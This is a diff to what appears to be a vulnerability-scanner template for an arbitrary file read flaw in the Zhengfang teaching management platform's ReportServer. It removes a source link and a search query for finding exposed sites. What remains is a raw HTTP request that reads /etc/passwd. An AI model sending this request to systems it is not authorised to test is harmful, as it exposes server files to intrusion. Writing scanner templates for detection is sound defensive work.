@@ -3,12 +3,8 @@ info:
   name: 正方教学管理信息服务平台ReportServer 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ph1nogrrskrgxay0'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ph1nogrrskrgxay0
-    fofa: body="正方软件股份有限公司" && title="教学管理信息服务平台"
 http:
 - raw:
   - 'GET /WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true HTTP/1.1
